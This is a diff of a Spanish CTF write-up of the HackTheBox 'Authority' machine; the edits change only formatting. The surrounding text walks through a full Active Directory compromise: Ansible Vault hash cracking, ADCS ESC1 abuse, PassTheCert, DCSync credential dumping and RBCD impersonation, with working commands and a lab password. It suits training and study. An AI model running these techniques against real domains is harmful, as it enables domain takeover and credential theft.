@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Authority**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
+Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`Authority`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.222 -oG allPorts
@@ -504,7 +504,7 @@ $ANSIBLE_VAULT;1.1;AES256
 
 Para continuar con el proceso de cracking de los hashes obtenidos desde los archivos de Ansible Vault, hemos seguido los siguientes pasos:
 
-1. **Extracción de hashes con `ansible2john`**: Utilizamos el comando `ansible2john` para convertir los archivos de Ansible Vault en un formato compatible con herramientas como **John the Ripper** o **Hashcat**. Esto nos permite obtener los hashes en su forma estructurada para ser crackeados.
+1. **Extracción de hashes con** `ansible2john`: Utilizamos el comando `ansible2john` para convertir los archivos de Ansible Vault en un formato compatible con herramientas como **John the Ripper** o **Hashcat**. Esto nos permite obtener los hashes en su forma estructurada para ser crackeados.
 2. **Contenido de los hashes**: El resultado de la ejecución del comando muestra los hashes extraídos de los tres archivos. A continuación, el contenido de los hashes:
 
 ```bash
@@ -515,7 +515,7 @@ pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2dd
 ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
 ```
 
-Al crackear los hashes de Ansible Vault con **Hashcat**, utilizando el siguiente comando:
+Al crackear los hashes de Ansible Vault con `Hashcat`, utilizando el siguiente comando:
 
 Nos encontramos con que los tres hashes, correspondientes a `pwm_admin_login, pwm_admin_password y ldap_admin_password`, fueron descifrados con la misma contraseña:
 
@@ -667,7 +667,7 @@ Desde el Domain Controller, importaremos en memoria el `adPEAS` y lo invocaremos
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS
 ```
 
-En la enumeración con **adPEAS**, identificamos que la máquina tiene **Active Directory Certificate Services (AD CS)** habilitado, específicamente con la CA **AUTHORITY-CA**, que está corriendo en `authority.authority.htb` (IP `10.10.11.222`).
+En la enumeración con `adPEAS`, identificamos que la máquina tiene `Active Directory Certificate Services (ADCS)` habilitado, específicamente con la CA `AUTHORITY-CA`, que está corriendo en `authority.authority.htb` (IP `10.10.11.222`).
 
 Al revisar los **templates disponibles**, encontramos varios, entre ellos:
 
@@ -679,7 +679,7 @@ Al revisar los **templates disponibles**, encontramos varios, entre ellos:
 * **Administrator**
 * Y otros más...
 
-Lo interesante es que el template **CorpVPN** tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que indica que permite definir el Subject cuando se solicita un certificado. Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.
+Lo interesante es que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que indica que permite definir el Subject cuando se solicita un certificado. Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.
 
 ```powershell
 [?] +++++ Searching for Active Directory Certificate Services Information +++++
@@ -724,9 +724,9 @@ EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_
 
 ### Abusing Active Directory Certificate Services (ADCS)
 
-Confirmamos la existencia de **ESC1 (Enrollment Services Configuration #1)** en el servicio **Active Directory Certificate Services (AD CS)** de la CA `AUTHORITY-CA`.
+Confirmamos la existencia de `ESC1 (Enrollment Services Configuration #1)` en el servicio `Active Directory Certificate Services (ADCS)` de la CA `AUTHORITY-CA`.
 
-Usando **Certipy**, identificamos que el template `CorpVPN` tiene configurado el flag `ENROLLEE_SUPPLIES_SUBJECT` y permite autenticación de cliente (`Client Authentication`). Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.
+Usando `Certipy`, identificamos que el template `CorpVPN` tiene configurado el flag `ENROLLEE_SUPPLIES_SUBJECT` y permite autenticación de cliente (`Client Authentication`). Además, el grupo `HTB\Domain Computers` tiene permisos de inscripción sobre este template.
 
 ```bash
 ❯ certipy-ad find -u 'svc_ldap'@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout
@@ -815,7 +815,7 @@ Certificate Templates
 
 ### ESC1 exploitation case (Machine Account) with certipy-ad
 
-Intentamos explotar **ESC1**, pero el usuario `svc_ldap` no tiene permisos de inscripción (`enrollment`) en el template `CorpVPN`. Solo las cuentas dentro del grupo **HTB\Domain Computers** pueden inscribirse y solicitar certificados con este template.
+Intentamos explotar `ESC1`, pero el usuario `svc_ldap` no tiene permisos de inscripción (`enrollment`) en el template `CorpVPN`. Solo las cuentas dentro del grupo `HTB\Domain Computers` pueden inscribirse y solicitar certificados con este template.
 
 Si podemos comprometer un equipo con una cuenta de máquina (`AUTHORITY.HTB\PC$`), podríamos usarla para inscribir un certificado y luego abusar de él.
 
@@ -829,7 +829,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 Would you like to save the private key? (y/N) 
 ```
 
-Confirmamos con **adPEAS** que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que permite al solicitante definir el Subject Alternative Name (SAN). Sin embargo, también verificamos que **solo las cuentas dentro del grupo `HTB\Domain Computers` tienen permisos de inscripción (`enrollment`)**.
+Confirmamos con `adPEAS` que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que permite al solicitante definir el Subject Alternative Name (SAN). Sin embargo, también verificamos que **solo las cuentas dentro del grupo `HTB\Domain Computers` tienen permisos de inscripción (`enrollment`)**.
 
 ```powershell
 [?] +++++ Checking Template 'CorpVPN' +++++
@@ -837,9 +837,9 @@ Confirmamos con **adPEAS** que el template `CorpVPN` tiene el flag `ENROLLEE_SUP
 [+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
 ```
 
-En el resultado de **adPEAS**, observamos que el **MachineAccountQuota** está configurado en **10**, lo que significa que cualquier usuario autenticado puede agregar hasta 10 equipos al dominio.
+En el resultado de `adPEAS`, observamos que el `MachineAccountQuota` está configurado en **10**, lo que significa que cualquier usuario autenticado puede agregar hasta 10 equipos al dominio.
 
-Dado que previamente identificamos que **solo los Domain Computers tienen permisos de enrollment** en el template vulnerable, podemos aprovechar esta configuración para **crear una cuenta de máquina controlada por nosotros** y así explotar **ESC1**.
+Dado que previamente identificamos que **solo los Domain Computers tienen permisos de enrollment** en el template vulnerable, podemos aprovechar esta configuración para **crear una cuenta de máquina controlada por nosotros** y así explotar `ESC1`.
 
 ```powershell
 [?] +++++ Checking Add-Computer Permissions +++++
@@ -931,7 +931,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-Al intentar autenticarnos con el certificado **PFX**, obtenemos un error **KDC\_ERR\_PADATA\_TYPE\_NOSUPP**, lo que indica que el KDC no admite el tipo de autenticación proporcionado. Más adelante, exploraremos otras formas de autenticarnos con este certificado para intentar acceder con éxito al dominio.
+Al intentar autenticarnos con el certificado `PFX`, obtenemos un error `KDC_ERR_PADATA_TYPE_NOSUPP`, lo que indica que el KDC no admite el tipo de autenticación proporcionado. Más adelante, exploraremos otras formas de autenticarnos con este certificado para intentar acceder con éxito al dominio.
 
 ```bash
 ❯ certipy-ad auth -pfx administrator.pfx -username Administrator -domain authority.htb
@@ -944,9 +944,9 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 ### Authenticating with certificates when PKINIT is not supported (PassTheCert.py)
 
-Nos encontramos con varios blogs que mencionan el error **KDC\_ERR\_PADATA\_TYPE\_NOSUPP**, el cual ocurre cuando el **controlador de dominio no soporta PKINIT**. Esto impide que autenticarnos directamente con el certificado PFX.
+Nos encontramos con varios blogs que mencionan el error `KDC_ERR_PADATA_TYPE_NOSUPP`, el cual ocurre cuando el **controlador de dominio no soporta PKINIT**. Esto impide que autenticarnos directamente con el certificado PFX.
 
-Como alternativa, podemos utilizar **PassTheCert** para autenticarnos a **LDAP a través de SChannel** con nuestro certificado. Aunque esto solo nos daría acceso a LDAP, podría ser suficiente si el certificado nos identifica como **Administrador de Dominio**.
+Como alternativa, podemos utilizar `PassTheCert` para autenticarnos a `LDAP a través de SChannel` con nuestro certificado. Aunque esto solo nos daría acceso a LDAP, podría ser suficiente si el certificado nos identifica como `Administrador de Dominio`.
 
 {% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}
 
@@ -962,7 +962,7 @@ Also, according to Microsoft, “This problem can happen because the wrong certi
 If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.
 {% endhint %}
 
-Lo primero que haremos será extraer la **clave privada** y el **certificado** desde el archivo PFX que obtuvimos del usuario **Administrator**. Para ello, utilizamos **Certipy** de la siguiente manera. A continuación, haremos uso de la herramienta `PassTheCert.py` para autentifcarnos con el certificado obtenido.
+Lo primero que haremos será extraer la **clave privada** y el **certificado** desde el archivo PFX que obtuvimos del usuario `Administrator`. Para ello, utilizamos `Certipy` de la siguiente manera. A continuación, haremos uso de la herramienta `PassTheCert.py` para autentifcarnos con el certificado obtenido.
 
 {% embed url="https://github.com/AlmondOffSec/PassTheCert" %}
 
@@ -989,9 +989,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ### Nº1 PrivEsc - Adding user to Domain Admins group trough PassTheCert Authentication
 
-El primer método que probamos fue utilizar **PassTheCert** para conectarnos a una **shell de LDAP** que ofrece la herramienta. Desde ahí, usamos el comando **add\_user\_to\_group** para añadir el usuario no privilegiado que teníamos previamente al grupo **Domain Admins**.
+El primer método que probamos fue utilizar `PassTheCert` para conectarnos a una **shell de LDAP** que ofrece la herramienta. Desde ahí, usamos el comando `add_user_to_group` para añadir el usuario no privilegiado que teníamos previamente al grupo `Domain Admins`.
 
-El resultado confirma que el usuario **svc\_ldap** fue agregado con éxito al grupo **Domain Admins**, lo que nos otorga privilegios elevados en el dominio.
+El resultado confirma que el usuario **`svc_ldap`** fue agregado con éxito al grupo **`Domain Admins`**, lo que nos otorga privilegios elevados en el dominio.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
@@ -1027,9 +1027,9 @@ Type help for list of commands
 Adding user: svc_ldap to group Domain Admins result: OK
 ```
 
-Conectados al **DC** con el usuario **svc\_ldap** a través de **WinRM** (ya que verificamos previamente que tenía permisos para hacerlo), revisamos los miembros del grupo **Domain Admins** y confirmamos que ahora formamos parte de él.
+Conectados al **`DC`** con el usuario **`svc_ldap`** a través de **WinRM** (ya que verificamos previamente que tenía permisos para hacerlo), revisamos los miembros del grupo **Domain Admins** y confirmamos que ahora formamos parte de él.
 
-Aunque ya tenemos privilegios de **Domain Admin**, nuestro objetivo final es **convertirnos en el usuario Administrator**. Para ello, exploraremos otros ataques que nos permitan obtener acceso directo a esta cuenta.
+Aunque ya tenemos privilegios de **Domain Admin**, nuestro objetivo final es **convertirnos en el usuario `Administrator`**. Para ello, exploraremos otros ataques que nos permitan obtener acceso directo a esta cuenta.
 
 ```bash
 *Evil-WinRM* PS C:\Users\svc_ldap\Documents> net group "Domain Admins"
@@ -1043,9 +1043,9 @@ Administrator            svc_ldap
 The command completed successfully.
 ```
 
-Como ahora formamos parte de **Domain Admins**, tenemos permisos para realizar un ataque **DCSync**, lo que nos permite extraer los hashes de las credenciales del dominio mediante **secretsdump.py**.
+Como ahora formamos parte de **`Domain Admins`**, tenemos permisos para realizar un ataque **`DCSync`**, lo que nos permite extraer los hashes de las credenciales del dominio mediante `secretsdump.py`.
 
-Aquí obtenemos el **NT hash** del usuario **Administrator**, lo que nos permitirá realizar un **Pass-The-Hash** y acceder directamente con su cuenta.
+Aquí obtenemos el **NT hash** del usuario **`Administrator`**, lo que nos permitirá realizar un `Pass-The-Hash` y acceder directamente con su cuenta.
 
 ```bash
 ❯ secretsdump.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 -dc-ip 10.10.11.222 -just-dc-ntlm
@@ -1082,9 +1082,9 @@ ecfaa***************************
 
 ### Nº2 PrivEsc - Assigning DCSync permissions to a user through PassTheCert Authentication
 
-Otro método que encontramos es asignar permisos de **DCSync** a un usuario sin necesidad de añadirlo directamente al grupo **Domain Admins**, lo cual puede ser una acción más evidente. Utilizamos **PassTheCert** para otorgar estos permisos al usuario **svc\_ldap**, lo que nos permite realizar un **secretsdump** posteriormente para extraer hashes de contraseñas sin necesidad de ser parte del grupo de administradores.
+Otro método que encontramos es asignar permisos de **`DCSync`** a un usuario sin necesidad de añadirlo directamente al grupo **`Domain Admins`**, lo cual puede ser una acción más evidente. Utilizamos **`PassTheCert`** para otorgar estos permisos al usuario **`svc_ldap`**, lo que nos permite realizar un **`secretsdump`** posteriormente para extraer hashes de contraseñas sin necesidad de ser parte del grupo de administradores.
 
-Con este método, le otorgamos al usuario **svc\_ldap** permisos para realizar un **DCSync** sin necesidad de comprometer directamente a **Domain Admins**, lo que lo hace menos detectable. Esto nos permitirá extraer hashes de contraseñas y realizar otras acciones de escalada de privilegios.
+Con este método, le otorgamos al usuario **`svc_ldap`** permisos para realizar un **`DCSync`** sin necesidad de comprometer directamente a **`Domain Admins`**, lo que lo hace menos detectable. Esto nos permitirá extraer hashes de contraseñas y realizar otras acciones de escalada de privilegios.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
@@ -1093,7 +1093,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Granted user 'svc_ldap' DCSYNC rights!
 ```
 
-En este caso, usamos **nxc** para realizar el dump del archivo **NTDS.dit** desde el controlador de dominio. Este es otro método que aprovechamos para obtener los hashes de contraseñas del dominio. En este proceso, conseguimos hacer el dump de los hashes NTDS del controlador de dominio. Entre los resultados obtenidos, encontramos varios hashes relevantes, como los de los usuarios **Administrator**, **Guest**, **krbtgt**, y **svc\_ldap**.&#x20;
+En este caso, usamos **`nxc`** para realizar el dump del archivo **`NTDS.dit`** desde el controlador de dominio. Este es otro método que aprovechamos para obtener los hashes de contraseñas del dominio. En este proceso, conseguimos hacer el dump de los hashes NTDS del controlador de dominio. Entre los resultados obtenidos, encontramos varios hashes relevantes, como los de los usuarios **`Administrator`**, **`Guest`**, **`krbtgt`**, y **`svc_ldap`**.&#x20;
 
 Con esto, podríamos emplear la técnica de `PassTheHash` para autenticarnos como el usuario `Administrator` con su hash NTLM.
 
@@ -1128,11 +1128,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account rbcd_gzzcoo$ with password Gzzcoo123.
 ```
 
-El siguiente paso en la explotación de **Resource-based Constrained Delegation (RBCD)** consiste en configurar correctamente los permisos de delegación para que la máquina **rbcd\_gzzcoo$** pueda actuar en nombre de los usuarios de la máquina **AUTHORITY$**.
+El siguiente paso en la explotación de **`Resource-based Constrained Delegation (RBCD)`** consiste en configurar correctamente los permisos de delegación para que la máquina **`rbcd_gzzcoo$`** pueda actuar en nombre de los usuarios de la máquina **`AUTHORITY$`**.
 
-Con este comando, hemos configurado **rbcd\_gzzcoo$** para que pueda actuar en nombre de los usuarios en **AUTHORITY$** mediante el protocolo **S4U2Proxy**. Esto significa que ahora la máquina **rbcd\_gzzcoo$** tiene permisos para suplantar identidades de los usuarios de **AUTHORITY$**, lo que nos proporciona un vector para escalar privilegios aún más.
+Con este comando, hemos configurado **`rbcd_gzzcoo$`** para que pueda actuar en nombre de los usuarios en **`AUTHORITY$`** mediante el protocolo **`S4U2Proxy`**. Esto significa que ahora la máquina **`rbcd_gzzcoo$`** tiene permisos para suplantar identidades de los usuarios de **`AUTHORITY$`**, lo que nos proporciona un vector para escalar privilegios aún más.
 
-Al permitir que **rbcd\_gzzcoo$** actúe en nombre de **AUTHORITY$**, tenemos acceso a las credenciales y recursos protegidos por las políticas de delegación en la máquina **AUTHORITY$**. Esto abre la puerta a la obtención de privilegios elevados y al acceso a más recursos dentro del dominio.
+Al permitir que **`rbcd_gzzcoo$`** actúe en nombre de **`AUTHORITY$`**, tenemos acceso a las credenciales y recursos protegidos por las políticas de delegación en la máquina **`AUTHORITY$`**. Esto abre la puerta a la obtención de privilegios elevados y al acceso a más recursos dentro del dominio.
 
 ```bash
 ❯ python3 /opt/PassTheCert/Python/passthecert.py -action write_rbcd -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -delegate-to 'AUTHORITY$' -delegate-from 'rbcd_gzzcoo$'
@@ -1145,13 +1145,13 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*]     rbcd_gzzcoo$   (S-1-5-21-622327497-3269355298-2248959698-11604)
 ```
 
-Después de configurar la delegación RBCD correctamente, utilizamos **impacket-getST** para obtener el Ticket Granting Ticket (TGT) del usuario **Administrator** y luego lo usamos para suplantarlo. Ejecutamos el siguiente comando para obtener el ticket y realizar la suplantación mediante **S4U2Proxy.**
+Después de configurar la delegación RBCD correctamente, utilizamos **`impacket-getST`** para obtener el **`Ticket Granting Ticket (TGT)`** del usuario **`Administrator`** y luego lo usamos para suplantarlo. Ejecutamos el siguiente comando para obtener el ticket y realizar la suplantación mediante **`S4U2Proxy`.**
 
-Este proceso genera el ticket Kerberos necesario y lo guarda en el archivo **Administrator@cifs\_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache**. A continuación, usamos el ticket para ejecutar un comando **wmiexec.py** y obtener acceso remoto a la máquina **AUTHORITY.**
+Este proceso genera el ticket Kerberos necesario y lo guarda en el archivo **`Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache`**. A continuación, usamos el ticket para ejecutar un comando **`wmiexec.py`** y obtener acceso remoto a la máquina **`AUTHORITY`.**
 
-Esto nos otorga acceso con privilegios de **htb\administrator**. Al ejecutar **whoami**, verificamos que hemos conseguido los permisos de **Administrator**. También usamos el comando **ipconfig** para obtener detalles de la red, confirmando que la máquina **AUTHORITY** tiene la IP **10.10.11.222**.
+Esto nos otorga acceso con privilegios de **`htb\administrator`**. Al ejecutar **`whoami`**, verificamos que hemos conseguido los permisos de **`Administrator`**. También usamos el comando **`ipconfig`** para obtener detalles de la red, confirmando que la máquina `AUTHORITY` tiene la IP `10.10.11.222`.
 
-Con esto, logramos una escalada de privilegios exitosa utilizando **RBCD** a través de **PassTheCert** y Kerberos.
+Con esto, logramos una escalada de privilegios exitosa utilizando `RBCD` a través de `PassTheCert` y Kerberos.
 
 <pre class="language-bash"><code class="lang-bash">❯ impacket-getS<a data-footnote-ref href="#user-content-fn-1">T</a> -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator -dc-ip 10.10.11.222 'authority.htb'/'rbcd_gzzcoo$':'Gzzcoo123' 2>/dev/null
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
